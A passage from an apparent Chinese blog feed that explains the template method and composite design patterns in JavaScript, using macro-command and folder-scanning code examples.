class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;加柠檬&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> coffee = <span class="keyword">new</span> <span class="title class_">Coffee</span>();</span><br><span class="line">coffee.<span class="title function_">init</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tea = <span class="keyword">new</span> <span class="title class_">Tea</span>();</span><br><span class="line">tea.<span class="title function_">init</span>();</span><br></pre></td></tr></table></figure><p>在这段代码中，我们把brew、pourInCup、addCondiments这些方法依次传人Beverage函数，Beverage函数被调用之后返回构造器F。F类中包含了“模板方法”F.prototype.init。跟继承得到的效果一样，该“模板方法”里依然封装了饮料子类的算法框架。</p><h3 id="八、小结"><a href="#八、小结" class="headerlink" title="八、小结"></a>八、小结</h3><p>模板方法模式是一种典型的通过封装变化提高系统扩展性的设计模式。在传统的面向对象语言中，一个运用了模板方法模式的程序中，子类的方法种类和执行顺序都是不变的，所以我们把这部分逻辑抽象到父类的模板方法里面。而子类的方法具体怎么实现则是可变的，于是我们把这部分变化的逻辑封装到子类中。通过增加新的子类，我们便能给系统增加新的功能，并不需要改动抽象父类以及其他子类，这也是符合开放—封闭原则的。</p><p>但在JavaScript中，我们很多时候都不需要依样画瓢地去实现一个模版方法模式，高阶函数是更好的选择。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在JavaScript开发中用到集成的场景其实并不是很多，很多时候我们都喜欢用mix-in的方式给对象扩展属性。但这不代表继承在JavaScript里没有用武之地，虽然没有真正的类和继承机制，但我们可以通过原型prototype来变相地实现继承。&lt;/p&gt;
&lt;p&gt;基于继承的设</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>组合模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/13/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/13/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-12T16:06:47.000Z</published>
    <updated>2024-09-12T16:06:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>组合模式就是用小的子对象来构建更大的对象，而这些小的子对象本身也许是由更小的”孙对象”构成的。</p><h3 id="一、回顾宏命令"><a href="#一、回顾宏命令" class="headerlink" title="一、回顾宏命令"></a>一、回顾宏命令</h3><p>宏命令对象包含了一组具体的子命令对象，不管是宏命令对象，还是子命令对象，都有一个execute方法负责执行命令。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> closeDoorCommand = &#123;</span><br><span class="line">    <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;关门&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> openPcCommand = &#123;</span><br><span class="line">    <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开电脑&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> openQQCommand = &#123;</span><br><span class="line">    <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;登录QQ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MacroCommand</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">commandsList</span>: [],</span><br><span class="line">        <span class="attr">add</span>: <span class="keyword">function</span>(<span class="params">command</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">commandsList</span>.<span class="title function_">push</span>(command);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,command; command = <span class="variable language_">this</span>.<span class="property">commandsList</span>[i++];)&#123;</span><br><span class="line">                command.<span class="title function_">execute</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> marcoCommand = <span class="title class_">MarcoCommand</span>();</span><br><span class="line"></span><br><span class="line">marcoCommand.<span class="title function_">add</span>(closeDoorCommand);</span><br><span class="line">marcoCommand.<span class="title function_">add</span>(openPcCommand);</span><br><span class="line">marcoCommand.<span class="title function_">add</span>(openQQCommand);</span><br><span class="line"></span><br><span class="line">marcoCommand.<span class="title function_">execute</span>();</span><br></pre></td></tr></table></figure><p>通过这段代码，我们发现，宏命令中包含了一组子命令，它们组成了一个树形结构，这里是一颗结构非常简单的树：</p><p><img src="/../image/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/image-20240912193252727.png" alt="image-20240912193252727"></p><p>其中，marcoCommand被称为组合对象，closeDoorCommand、openPcCommand、openQQCommand都是叶对象。在marcoCommand的execute方法里，并不执行真正的操作，而是遍历它所包含的叶对象，把真正的execute请求委托给这些叶对象。</p><p>marcoCommand表现得像一个命令，但它实际上只是一组真正命令的”代理”。并非真正的代理，虽然结构上相似，但marcoCommand只负责传递请求给叶对象，它的目的不在于控制对叶对象的访问。</p><h3 id="二、组合模式的用途"><a href="#二、组合模式的用途" class="headerlink" title="二、组合模式的用途"></a>二、组合模式的用途</h3><p>组合模式将组合成树形结构，以表示”部分-整体”的层次结构。除了用来表示树形结构之外，组合模式的另一个好处是通过对象的多态性表现，使得用户对单个对象和组合对象的使用具有一致性，下面分别说明：</p><ul><li>表示树形结构。通过上面的例子，我们很容易找到组合模式的一个优点：提供了一种遍历树形结构的方案，通过调用组合对象方法的execute方法，程序会递归调用组合对象下面的叶对象的execute方法，所以我们的万能遥控器只需要一次操作，便能依次完成关门、打开电脑、登录QQ这几件事情。组合模式可以非常方便地描述对象部分-整体层次结构。</li><li>利用对象多态性统一对待组合对象和单个对象。利用对象的多态性表现，可以使客户端忽略组合对象和单个对象的不同。在组合模式中，客户将统一地使用组合结构中的所有对象，而不需要关心它究竟是组合对象还是单个对象。</li></ul><p>这在实际开发中会给客户带来相当大的便利性，当我们往万能遥控器里面添加一个命令的时候，并不关心这个命令是宏命令还是普通子命令&#x2F;这点对于我们不重要，我们只需要确定他是一个命令，并且这个命令拥有可执行的execute方法，那么这个命令就可以被添加进万能遥控器。</p><p>当宏命令和普通子命令接收到执行execute方法的请求时，宏命令和普通子命令都会做它们各自认为正确的事情。这些差异是隐藏在客户背后的，在客户看来，这种透明性可以让我们非常自由地扩展这个万能遥控器。</p><h3 id="三、请求在树中传递的过程"><a href="#三、请求在树中传递的过程" class="headerlink" title="三、请求在树中传递的过程"></a>三、请求在树中传递的过程</h3><p>在组合模式中，请求在树中传递地过程总是遵循一种逻辑。</p><p>以hml为例，请求从树最顶端的对象往下传递，如果当前处理请求的对象是叶对象（普通命令），叶对象自身会对请求作出相应的处理，如果当前处理请求的对象是组合对象（宏命令），组合对象则会遍历它属下的子节点，将请求继续传递给这些子节点。</p><p>总而言之，如果子节点是叶对象，叶对象自身会处理这个请求，而如果子节点还是组合对象，请求会继续往下传递。叶对象下面不会再有其他子节点，一个叶对象就是树的这条枝叶的尽头，组合对象下面可能还会由子节点，如图：</p><p><img src="/../image/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/image-20240912200206700.png" alt="image-20240912200206700"></p><p>请求从上到下沿着树进行传递，直到树的尽头。作为客户，只需要关心树最顶层的组合对象，客户只需要请求这个组合对象，请求便会沿着树往下传递，依次到达所有的叶对象。</p><p>在刚刚的例子中，由于宏命令和子命令组成的树太过简单，我们还不能清楚地看到组合模式带来的好处，如果只是简单地遍历一组子节点，迭代器便能解决所有的问题。接下来我们将创造一个更强大的宏命令，这个宏命令中又包含了另外一些宏命令和普通子命令，看起来是一棵相对较复杂的树。</p><h3 id="四、更强大的宏命令"><a href="#四、更强大的宏命令" class="headerlink" title="四、更强大的宏命令"></a>四、更强大的宏命令</h3><p>基本对象可以被组合成更复杂的组合对象，组合对象又可以被组合，这样不断递归下去，这棵树的结构可以支持任意多的复杂度。在树最终被构造完成之后，让整顿树最终运转起来的步骤非常简单，只需要调用最上层对象的execute方法。每当对最上层的对象进行一次请求时，实际上是在对整个树进行深度优先的搜索，而创建组合对象的程序员并不关心这些内在的细节，往这棵树里面添加一些新的节点对象时非常容易地事情。</p><h3 id="五、抽象类在组合模式中的作用"><a href="#五、抽象类在组合模式中的作用" class="headerlink" title="五、抽象类在组合模式中的作用"></a>五、抽象类在组合模式中的作用</h3><p>前面说到，组合模式最大的优点在于可以一致性地对待组合对象和基本对象，客户不需要知道当前处理的是宏命令还是普通命令，只要它是一个命令，并且有execute方法，这个命令就可以被添加到树中。</p><p>这种透明性带来的便利，在静态类型语言中体现得尤为明显。比如在Java中，实现组合模式的关键是Composite类和Leaf类都必须继承自一个Compenent抽象类。这个Compenent抽象类既代表组合对象，又代表叶对象，它能够保证组合对象和叶对象拥有同样的名字的方法，从而可以对同一消息都做出反馈。组合对象和叶对象的具体类型被隐藏在Compenent抽象类身后。</p><p>针对Compenent抽象类来编写程序，客户操作的始终是Compenent对象，而不用去区分到底是组合对象还是叶对象。</p><p>然而在JavaScript这种动态类型语言中，对象的多态性是与生俱来的，也没有编译器去检查变量的类型，所以我们通常不会去模拟一个”怪异”的抽象类，JavaScript中实现组合模式的难点在于要保证组合对象和叶对象拥有同样的方法，这通常需要用鸭子类型的思想对它们进行接口检查。</p><p>在JavaScript中实现组合模式，看起来缺乏一些严谨，我们的代码算不上安全，但能更快速和自由地开发，这既是JavaScript地缺点，也是它的优点。</p><h3 id="六、透明性带来的安全问题"><a href="#六、透明性带来的安全问题" class="headerlink" title="六、透明性带来的安全问题"></a>六、透明性带来的安全问题</h3><p>组合模式的透明性使得发起请求的客户不用去顾忌树中组合对象和叶对象的区别，但它们在本质上有是区别的。</p><p>组合对象可以拥有子节点，叶对象下面就没有子节点，所以我们也许会发生一些误操作，比如试图往叶对象中添加子节点。解决方案通常是给叶对象也添加add方法，并且在调用这个方法时，抛出一个异常来及时提醒客户。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">MacroCommand</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">commandsList</span>: [],</span><br><span class="line">        <span class="attr">add</span>: <span class="keyword">function</span>(<span class="params">command</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">commandsList</span>.<span class="title function_">push</span>(command);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,command; command = <span class="variable language_">this</span>.<span class="property">commandsList</span>[i++];)&#123;</span><br><span class="line">                command.<span class="title function_">execute</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> openTvCommand = &#123;</span><br><span class="line">    <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;打开电视&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">add</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;叶对象不能添加子节点&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> macroCommand = <span class="title class_">MacroCommand</span>();</span><br><span class="line"></span><br><span class="line">macroCommand.<span class="title function_">add</span>(openTvCommand);</span><br><span class="line">openTvCommand.<span class="title function_">add</span>(macroCommand);     <span class="comment">// Uncaught Error: 叶对象不能添加子节点</span></span><br></pre></td></tr></table></figure><h3 id="七、组合模式的例子-扫描文件夹"><a href="#七、组合模式的例子-扫描文件夹" class="headerlink" title="七、组合模式的例子-扫描文件夹"></a>七、组合模式的例子-扫描文件夹</h3><p>文件夹和文件之间的关系，非常适合用组合模式来描述。文件夹里面可以包含文件，又可以包含其他文件夹，最终可能组合成一棵树，组合模式在文件夹的应用中有以下两层好处。</p><ul><li>例如，我在同事的移动硬盘里找到了一些电子书，想把它们复制到F盘中的学习资料文件夹，在复制这些电子书的时候，我并不需要考虑这批文件的类型，不管它们是单独的电子书还是被放到了文件夹中。组合模式让Ctrl+V、Ctrl+C成为了一个统一的操作。</li><li>当我用杀毒软件扫描该文件夹时，往往不会关心里面有多少文件和子文件夹，组合模式使得我们只需要操作最外层的文件夹进行扫描。</li></ul><p>现在首先分别定义好文件夹Folder和文件File这两个类。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/************************ Folder ************************/</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Folder</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">files</span> = [];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Folder</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add</span> = <span class="keyword">function</span>(<span class="params">file</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">files</span>.<span class="title function_">push</span>(file);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Folder</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">scan</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开始扫描文件夹：&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, file, files = <span class="variable language_">this</span>.<span class="property">files</span>; file = files[i++];)&#123;</span><br><span class="line">        file.<span class="title function_">scan</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************ File ************************/</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">File</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件下面不能再添加文件&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">scan</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开始扫描文件：&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来创建一些文件夹和文件对象，并且让它们组合成一棵树，这棵树就是我们F盘里面的现有文件目录结构：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> folder = <span class="keyword">new</span> <span class="title class_">Folder</span>(<span class="string">&#x27;学习资料&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> folder1 = <span class="keyword">new</span> <span class="title class_">Folder</span>(<span class="string">&#x27;JavaScript&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> folder2 = <span class="keyword">new</span> <span class="title class_">Folder</span>(<span class="string">&#x27;jQuery&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> file1 = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;JavaScript设计模式与开发实践&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> file2 = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;精通jQuery&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> file3 = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;重构与模式&#x27;</span>)</span><br><span class="line"></span><br><span class="line">folder1.<span class="title function_">add</span>(file1);</span><br><span class="line">folder2.<span class="title function_">add</span>(file2);</span><br><span class="line"></span><br><span class="line">folder.<span class="title function_">add</span>(folder1);</span><br><span class="line">folder.<span class="title function_">add</span>(folder2);</span><br><span class="line">folder.<span class="title function_">add</span>(file3);</span><br></pre></td></tr></table></figure><p>现在的需求是把移动硬盘里的文件和文件价都复制到这棵树中，假设我们已经得到了这些文件对象：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> folder3 = <span class="keyword">new</span> <span class="title class_">Folder</span>(<span class="string">&#x27;Nodejs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> file4 = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;深入浅出Node.js&#x27;</span>);</span><br><span class="line">folder3.<span class="title function_">add</span>(file4);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> file5 = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;JavaScript语言精髓与编程实践&#x27;</span>);</span><br></pre></td></tr></table></figure><p>接下来就是把这些文件都添加到原有的树中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">folder.<span class="title function_">add</span>(folder3);</span><br><span class="line">folder.<span class="title function_">add</span>(file5);</span><br></pre></td></tr></table></figure><p>通过这个例子，我们再次看到客户是如何同等对待组合对象和叶对象。在添加一批文件的操作过程中，客户不用分辨它们到底是文件还是文件夹。新增加的文件和文件夹能够很容易地添加到原来的树结构中，和树里已有的对象一起工作。</p><p>我们改变了树的结构，增加了新的数据，却不用修改任何一句原有的代码，这是符合开放-封闭原则的。</p><p>运用了组合模式之后，扫描整个文件夹的操作也是轻而易举的，我们只需要操作树的最顶端对象：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">folder.<span class="title function_">scan</span>();</span><br></pre></td></tr></table></figure><h3 id="八、一些值得注意的地方"><a href="#八、一些值得注意的地方" class="headerlink" title="八、一些值得注意的地方"></a>八、一些值得注意的地方</h3><p>在使用组合模式的时候，还有以下几个值得我们注意的地方。</p><ol><li><h4 id="组合模式不是父子关系"><a href="#组合模式不是父子关系" class="headerlink" title="组合模式不是父子关系"></a>组合模式不是父子关系</h4><p>组合模式的树型结构容易让人误以为组合对象和叶对象是父子关系，这是不正确的。</p><p>组合模式是一种HAS-A（聚合）的关系，而不是IS-A。组合对象包含一组叶对象，但Leaf并不是Composite的子类。组合对象把请求委托给它所包含的所有叶对象，它们能够合作的关键是拥有相同的接口。</p><p>为了方便描述，有时候把上下级对象称为父子节点，但大家都知道，它们并非真正意义上的父子关系。</p></li><li><h4 id="对叶对象操作的一致性"><a href="#对叶对象操作的一致性" class="headerlink" title="对叶对象操作的一致性"></a>对叶对象操作的一致性</h4><p>组合模式除了要求组合对象和叶对象拥有相同的接口之外，还有一个必要条件，就是对一组叶对象的操作必须具有一致性。</p><p>比如公司要给全体员工发放元旦的过节费1000块，这个场景可以运用组合模式，但如果公司给今天过生日的员工发送一封生日祝福的邮件，组合模式在这里就没有用武之地了，除非先把今天过生日的员工挑选出来。只有用一致的方式对待列表中的每个叶对象的时候，才适合使用组合模式。</p></li><li><h4 id="双向映射关系"><a href="#双向映射关系" class="headerlink" title="双向映射关系"></a>双向映射关系</h4><p>发送过节费的通知步骤是从公司到各个部门，再到各个小组，最后到每个员工的邮箱里。这本身是一个组合模式的好例子，但要考虑的一种情况是，也许某些员工属于多个组织架构。比如某位架构师既隶属于开发组，又隶属于架构组，对象之间的关系并不是严格意义上的层次结构，在这种情况下，是不适合使用组合模式的，该架构师很可能会收到两份过节费。</p><p>这种复合情况下我们必须给父节点和子节点建立双向映射关系，一个简单的方法是给小组和员工对象都增加集合来保存对方的引用。但是这种相互间的引用相当复杂，而且对象之间产生了过多的耦合性，修改或者删除一个对象都变得困难，此时我们可以引入中介者模式来管理这些对象。</p></li><li><h4 id="用职责链模式提高组合模式性能"><a href="#用职责链模式提高组合模式性能" class="headerlink" title="用职责链模式提高组合模式性能"></a>用职责链模式提高组合模式性能</h4><p>在组合模式中，如果树的结构比较复杂，节点数量很多，在遍历树的过程中，性能方面也许表现得不够理想。有时候我们确实可以借助一些技巧，在实际操作中避免遍历整棵树，有一种现成的方案是借助职责链模式。职责链模式一般需要我们手动去设置链条，但在组合模式中，父对象和子对象之间实际上形成了天然的职责链。让请求顺着链条从父对象往子对象传递，或者是反过来从子对象往父对象传递，直到遇到可以处理该请求的对象为止，这也是职责链模式的经典运用场景之一。</p></li></ol><h3 id="九、引用父对象"><a href="#九、引用父对象" class="headerlink" title="九、引用父对象"></a>九、引用父对象</h3><p>在七节提到的例子中，组合对象保存了它下面的子节点的引用，这是组合模式的特点，此时树结构是从上至下的。但有时候我们需要在子节点上保持对父节点的引用，比如在组合模式中使用职责链时，有可能需要让请求从子节点往父节点上冒泡传递。还有当我们删除某个文件的时候，实际上是从这个文件所在的上层文件中删除文件的。</p><p>现在来改写扫描文件夹的代码，使得在扫描整个文件夹之前，我们可以先移除某一个具体的文件。</p><p>首先改写Folder类和File类，在这两个类的构造函数中，增加this.parent属性，并且在调用add方法的时候，正确设置文件或者文件夹的父节点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Folder</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">parent</span> = <span class="literal">null</span>;     <span class="comment">// 增加this.parent属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">files</span> = [];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Folder</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add</span> = <span class="keyword">function</span>(<span class="params">file</span>)&#123;</span><br><span class="line">    file.<span class="property">parent</span> = <span class="variable language_">this</span>;     <span class="comment">// 设置父对象</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">files</span>.<span class="title function_">push</span>(file);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Folder</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">scan</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开始扫描文件夹：&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,file, files = <span class="variable language_">this</span>.<span class="property">files</span>; file = files[i++];)&#123;</span><br><span class="line">        file.<span class="title function_">scan</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来增加<code>Folder.prototype.remove</code>方法，表示移除该文件夹：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Folder</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">remove</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">this</span>.<span class="property">parent</span>)&#123;       <span class="comment">// 根节点或者树外的游离节点 </span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> files = <span class="variable language_">this</span>.<span class="property">parent</span>.<span class="property">files</span>, l = files.<span class="property">length</span> - <span class="number">1</span>; l &gt;= <span class="number">0</span>; l--)&#123;</span><br><span class="line">        <span class="keyword">var</span> file = files[l];</span><br><span class="line">        <span class="keyword">if</span>(file === <span class="variable language_">this</span>)&#123;</span><br><span class="line">            files.<span class="title function_">splice</span>(l, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>File.prototype.remove</code>方法里，首先会判断<code>this.parent</code>，如果<code>this.parent</code>为null，那么这个文件夹要么是树的根节点，要么是还没有添加到树的游离节点，这时候没有节点需要从树中移除，我们暂且让remove方法直接return，表示不做任何操作。</p><p>如果this.parent不为null，则说明该文件夹有父节点存在，此时遍历父节点中保存的子节点列表，删除想要删除的子节点。</p><p>File类的实现基本一致：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">File</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">parent</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;不能添加在文件下面&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">scan</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开始扫描文件：&#x27;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">remove</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">this</span>.<span class="property">parent</span>)&#123;           <span class="comment">// 根节点或者树外的游离节点</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> files = <span class="variable language_">this</span>.<span class="property">parent</span>.<span class="property">files</span>, l = files.<span class="property">length</span> - <span class="number">1</span>; l &gt;= <span class="number">0</span>; l--)&#123;</span><br><span class="line">        <span class="keyword">var</span> file = file[l];</span><br><span class="line">        <span class="keyword">if</span>(file === <span class="variable language_">this</span>)&#123;</span><br><span class="line">            files.<span class="title function_">splice</span>(l, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面测试一下移除文件功能：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> folder = <span class="keyword">new</span> <span class="title class_">Folder</span>(<span class="string">&#x27;学习资料&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> folder1 = <span class="keyword">new</span> <span class="title class_">Folder</span>(<span class="string">&#x27;JavaScript&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> file1 = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;深入浅出Node.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line">folder1.<span class="title function_">add</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;JavaScript语言精髓与编程实践&#x27;</span>));</span><br><span class="line">folder.<span class="title function_">add</span>(folder1);</span><br><span class="line">folder.<span class="title function_">add</span>(file1);</span><br><span class="line"></span><br><span class="line">folder1.<span class="title function_">remove</span>();    <span class="comment">// 移除文件夹</span></span><br><span class="line">folder.<span class="title function_">scan</span>();</span><br></pre></td></tr></table></figure><h3 id="十、何时使用组合模式"><a href="#十、何时使用组合模式" class="headerlink" 